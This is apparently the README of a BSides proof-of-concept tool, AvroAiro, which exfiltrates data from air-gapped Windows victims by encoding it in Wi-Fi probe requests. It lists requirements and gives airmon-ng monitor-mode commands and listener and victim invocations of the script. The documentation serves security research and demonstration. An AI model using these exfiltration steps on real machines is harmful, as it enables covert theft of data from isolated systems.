# AvroAiro
BSides Presentation: Jumping Airgaps with Networkless Exfiltration

![oob-fram-vs-wlan drawio](https://github.com/user-attachments/assets/deadfd2e-4486-43df-a231-c0deaf569ab3)

## Overview - what is this?
AvroAiro is a tool that was created to exfiltrate data via Probe Requests (PRQs).

### Why is this different?
This is different because monitor mode is not required on the victim to perform this exfiltration.

To intercept probe requests sent from victim devices, the attacker (or listener) needs to have monitor mode.
This is because probe requests are management frames, which are out-of-band.

### Important Disclaimer
This tool should be used responsibly, and is showcased as a proof of concept.
Anyone using this tool is assumed to abide by applicable laws. 

### Requirements
- Administrator / sudo privileges on both attacker and victim
- Powershell with regedit privileges
- aircrack-ng
- pcap
- scapy

## AvroAiro Usage
```
python AvroAiro.py -h

usage:

options:

```
### On Attacker Machine:
- Make sure the the proper channel and band is selected.
```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng start <wlan-adapter> <channel>
sudo python3 AvroAiro.py -l -id "BEEFFF" -O 1
```
### On victim machine (windows):
- Currently the exfiltrated message is hardcoded in the script
```
sudo python3 AvroAiro.py -v -id "BEEFFF" -O 2
```

